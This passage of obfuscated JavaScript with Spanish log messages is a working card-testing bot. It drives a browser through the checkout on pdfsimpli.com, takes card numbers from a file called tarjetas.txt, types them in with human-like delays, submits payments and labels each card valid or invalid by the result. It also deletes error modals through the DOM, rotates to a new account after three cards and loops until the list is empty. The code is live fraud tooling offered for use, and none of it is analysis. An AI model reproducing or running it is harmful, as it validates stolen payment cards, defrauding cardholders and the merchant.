                await this.log("🚀 Pago enviado (COMPLETO LENTO)");

                return true;

            } catch (_0xafdf) {
                await this.log("⚠️ Error llenando: " + _0xafdf.message);
                return false;
            }
        };

        for (let _0xb0ef = 0; _0xb0ef < 3; _0xb0ef++) {
            const _0xb1ff = await _0x955f(_0xb0ef);
            if (_0xb1ff) return true;

            await this.log("🔄 Reparando formulario… limpiando campos…");

            try {
                await this.page.evaluate(() => {
                    const _0xb20f = (_0xb31f) => {
                        const _0xb42f = document.querySelector(_0xb31f);
                        if (_0xb42f) _0xb42f.value = "";
                    };

                    _0xb20f("#checkout_form_card_name");
                    _0xb20f("[name='cardName']");
                    _0xb20f("input[name='cardNumber']");
                    _0xb20f("input#data[name='Data']");
                });
            } catch (_0xb53f) { }

            await this._0x1cff(1500);
        }

        throw new Error("No se pudo llenar formulario completo en 3 intentos");
    }
}

// =============================================================
// MÉTODOS ADICIONALES
// =============================================================

_0x1bef.prototype._0xb64f = async function (_0xb75f, _0xb86f) {
    await this._0x379f();
    
    await this.log("⚡ FLUJO RÁPIDO: modo lento + autoreparación...");

    const _0xb97f = async (_0xba8f) => {
        await this.log(`📝 Intento rápido #${_0xba8f + 1}`);

        try {
            let _0xbb9f = null;
            let _0xbccf = null;
            const _0xbddf = this.page.frames();

            for (const _0xbeef of _0xbddf) {
                const _0xbfff = await _0xbeef.$("input[name='cardNumber'], input#data");
                if (!_0xbfff) continue;
                const _0xc00f = await _0xbfff.evaluate(_0xc11f => _0xc11f.getAttribute("maxlength") || "");
                if (_0xc00f && parseInt(_0xc00f, 10) >= 15) {
                    _0xbb9f = _0xbfff;
                    break;
                }
            }

            if (!_0xbb9f) throw new Error("Campo tarjeta no encontrado (rápido)");

            await _0xbb9f.click({ clickCount: 3 });
            await this._0x1cff(150);
            await _0xbb9f.type(_0xb75f, { delay: 85 });

            await this._0x1cff(600);

            for (const _0xc22f of _0xbddf) {
                const _0xc33f = await _0xc22f.$("input#data[name='Data'], input[maxlength='4']");
                if (!_0xc33f) continue;

                const _0xc44f = await _0xc33f.evaluate(_0xc55f => _0xc55f.getAttribute("maxlength") || "");
                if (_0xc44f === "4") {
                    _0xbccf = _0xc33f;
                    break;
                }
            }

            if (!_0xbccf) throw new Error("Campo RUC no encontrado (rápido)");

            await _0xbccf.click({ clickCount: 3 });
            await this._0x1cff(150);
            await _0xbccf.type(_0xb86f, { delay: 85 });

            await this._0x1cff(500);

            let _0xc66f = await this._0x269f("#btnChargeebeeSubmit");
            if (!_0xc66f) throw new Error("Botón submit no encontrado (rápido)");

            await this.page.evaluate(
                _0xc77f => _0xc77f.scrollIntoView({ behavior: "instant" }),
                _0xc66f
            );
            await _0xc66f.click();

            await this.log("🚀 Pago enviado (RÁPIDO LENTO)");
            await this._0x1cff(2000);

            return true;

        } catch (_0xc88f) {
            await this.log("⚠️ Error llenando rápido: " + _0xc88f.message);
            return false;
        }
    };

    for (let _0xc99f = 0; _0xc99f < 3; _0xc99f++) {
        const _0xcaaf = await _0xb97f(_0xc99f);

        if (_0xcaaf) return true;

        await this.log("🔄 Reparando formulario rápido… limpiando campos…");

        try {
            await this.page.evaluate(() => {
                const _0xcbbf = (_0xcccf) => {
                    const _0xcddf = document.querySelector(_0xcccf);
                    if (_0xcddf) _0xcddf.value = "";
                };
                _0xcbbf("input[name='cardNumber']");
                _0xcbbf("input#data[name='Data']");
            });
        } catch (_0xceef) { }

        await this._0x1cff(1500);
    }

    throw new Error("❌ No se pudo llenar rápido en 3 intentos");
};

_0x1bef.prototype._0xcfff = async function () {
    const _0xd00f = [this.page, ...this.page.frames()];

    for (const _0xd11f of _0xd00f) {
        try {
            const _0xd22f = await _0xd11f.evaluateHandle(() => {
                const _0xd33f = [...document.querySelectorAll("button")]
                    .find(_0xd44f => (_0xd44f.innerText || "").trim().toLowerCase().includes("close"));
                return _0xd33f || null;
            });
            if (_0xd22f && _0xd22f.asElement()) return _0xd22f.asElement();
        } catch (_0xd55f) {}
    }

    return null;
};

_0x1bef.prototype._0xd66f = async function () {
    await this.log("🔎 Buscando botón Close...");

    let _0xd77f = false;

    for (let _0xd88f = 0; _0xd88f < 12; _0xd88f++) {
        const _0xd99f = await this._0xcfff();

        if (!_0xd99f) {
            if (!_0xd77f) {
                await this.log("🟢 No hay modal de error visible");
                return false;
            } else {
                await this.log("🟢 Modal ya cerrado");
                return true;
            }
        }

        _0xd77f = true;
        await this.log(`🔴 Close detectado → click intento ${_0xd88f + 1}`);

        try {
            await this.page.evaluate(_0xdaaf => _0xdaaf.scrollIntoView({ behavior: "instant", block: "center" }), _0xd99f);
        } catch (_0xdbbf) {}

        try {
            const _0xdccf = await _0xd99f.boundingBox();
            if (_0xdccf) {
                await this.page.mouse.move(_0xdccf.x + _0xdccf.width / 2, _0xdccf.y + _0xdccf.height / 2);
                await this._0x1cff(80);
                await this.page.mouse.down();
                await this._0x1cff(70);
                await this.page.mouse.up();
            } else {
                await this.page.evaluate(_0xdddf => _0xdddf.click(), _0xd99f);
            }
        } catch (_0xdeef) {}

        await this._0x1cff(1000);
    }

    await this.log("💣 FORCE MODE → Eliminando modal por DOM");

    try {
        await this.page.evaluate(() => {
            [...document.querySelectorAll("button")].forEach(_0xdf0f => {
                if ((_0xdf0f.innerText || "").toLowerCase().includes("close")) {
                    _0xdf0f.parentElement?.parentElement?.remove();
                }
            });
        });
    } catch (_0xe01f) {}

    await this._0x1cff(500);
    await this.log("🟢 Modal destruido (Force Mode)");
    return true;
};

_0x1bef.prototype._0xe12f = async function (_0xe23f) {
    const _0xe34f = _0xe23f ? _0xe23f.cedula : "N/A";

    await this.log("⏳ Esperando 10 segundos para procesar el pago...");
    await this._0x1cff(10000);

    const _0xe45f = Date.now();
    const _0xe56f = 15000;
    let _0xe67f = false;

    while (Date.now() - _0xe45f < _0xe56f) {
        const _0xe78f = this.page.url();
        const _0xe89f = (await this.page.content()).toLowerCase();

        if (_0xe78f.includes("pdfsimpli.com/app/billing/confirmation")) {
            _0xe67f = true;
        }

        if (!_0xe67f) {
            try {
                const _0xe9af = await this.page.evaluate(() => {
                    const _0xebbf = ["payment successful", "thank you", "transaction completed"];
                    return _0xebbf.some(_0xeccf =>
                        [...document.querySelectorAll("*")]
                            .some(_0xeddf => (_0xeddf.innerText || "").toLowerCase().includes(_0xeccf))
                    );
                });
                if (_0xe9af) _0xe67f = true;
            } catch (_0xeeef) {}
        }

        if (!_0xe67f) {
            const _0xefff = ["payment successful", "thank you", "transaction completed"];
            if (_0xefff.some(_0xf00f => _0xe89f.includes(_0xf00f))) {
                _0xe67f = true;
            }
        }

        if (_0xe67f) break;
        await this._0x1cff(1000);
    }

    if (_0xe67f) {
        await this.log(`${_0x3d4a.nG}✅ TARJETA VÁLIDA — PAGO EXITOSO (${_0xe34f})${_0x3d4a.reset}`);
        if (_0xe23f) await this._0x5acf(_0xe23f);
        return true;
    }

    const _0xf11f = await this._0xd66f();
    if (_0xf11f) {
        await this.log(`${_0x3d4a.nK}❌ TARJETA INVÁLIDA — MODAL CLOSE DETECTADO (${_0xe34f})${_0x3d4a.reset}`);
        return false;
    }

    const _0xf22f = (await this.page.content()).toLowerCase();
    const _0xf33f = ["declined", "error", "invalid", "failed", "rejected"];
    if (_0xf33f.some(_0xf44f => _0xf22f.includes(_0xf44f))) {
        await this.log(`${_0x3d4a.nK}❌ TARJETA INVÁLIDA — MENSAJE DE ERROR DETECTADO (${_0xe34f})${_0x3d4a.reset}`);
        return false;
    }

    await this.log(`${_0x3d4a.nK}❌ TARJETA INVÁLIDA — TIMEOUT SIN ÉXITO NI CLOSE (${_0xe34f})${_0x3d4a.reset}`);
    return false;
};

_0x1bef.prototype._0xf55f = async function (_0xf66f, _0xf77f) {
    const { cedula: _0xf88f, mes: _0xf99f, anio: _0xfAAF, ruc: _0xfBBf } = _0xf66f;
    const _0xfCCf = "User" + Math.random().toString(36).slice(2, 7);

    if (!_0xf77f) {
        await this._0x8fff(_0xf88f, _0xf99f, _0xfAAF, _0xfBBf, _0xfCCf);
    } else {
        await this._0xb64f(_0xf88f, _0xfBBf);
    }

    const _0xfDDf = await this._0xe12f(_0xf66f);

    await this._0x657f(_0xf66f, _0xfDDf);
    await this._0x5dff(_0xf66f);

    return _0xfDDf;
};

_0x1bef.prototype._0xfEEf = async function () {
    console.log(
        _0x3d4a.nP +
        _0x3d4a.bright +
`
══════════════════════════════════════════════════════════════════
🔥 LAZARO SE LEVANTÓ DE ENTRE LOS MUERTOS Y REGRESÓ A LA VIDA 🔥
══════════════════════════════════════════════════════════════════
` +
        _0x3d4a.reset
    );
    
    await this.log("🌐 Cargando destino...");
    await this.page.goto("https://pdfsimpli.com", {
        waitUntil: "networkidle2",
        timeout: 60000
    });

    await this._0x1cff(1500);

    await this._0x6bdf();
    await this._0x723f();
    await this._0x756f();
    await this._0x7abf();
    await this._0x7cdf();
    await this._0x8bbf();

    this.cardsThisAccount = 0;

    while (this.cardsThisAccount < 3) {
        const _0xfFFf = this._0x58af();
        if (!_0xfFFf) {
            await this.log("⛔ No hay más tarjetas en tarjetas.txt");
            return false;
        }

        const _0x1000f = this.cardsThisAccount > 0;
        this.cardsThisAccount++;

        await this.log(
            `💳 Probando tarjeta #${this.cardsThisAccount} (modo: ${_0x1000f ? "RÁPIDO" : "COMPLETO"})`
        );

        try {
            const _0x1011f = await this._0xf55f(_0xfFFf, _0x1000f);

            if (_0x1011f) {
                await this.log("🏁 CUENTA FINALIZADA POR TARJETA VÁLIDA → CREAR NUEVA CUENTA");
                this.cuentasProcesadas++;
                return true;
            }

        } catch (_0x1022f) {
            await this.log("⚠️ Error procesando tarjeta: " + _0x1022f.message);
        }
    }

    await this.log("⛔ Las 3 tarjetas de esta cuenta fueron inválidas — se creará una nueva cuenta.");
    this.cuentasProcesadas++;
    return true;
};

_0x1bef.prototype.close = async function () {
    if (this.browser) {
        await this.browser.close();
        await this.log("🔚 Navegador cerrado");
    }
};

// =============================================================
// MAIN LOOP — INFINITO
// =============================================================
(async () => {
    const _0x1033f = new _0x1bef();
    await _0x1033f._0x502f();
    await _0x1033f.initialize();

    try {
        while (true) {
            await _0x1033f._0x457f();

            const _0x1044f = await _0x1033f._0xfEEf();

            await _0x1033f.close();

            await _0x1033f.initialize();

            if (!_0x1044f) {
                await _0x1033f.log("🚫 No hay más tarjetas — BOT FINALIZADO.");
                break;
            }
        }

    } catch (_0x1055f) {
        console.error("❌ ERROR GENERAL:", _0x1055f.message);
    }

    await _0x1033f.close();
})();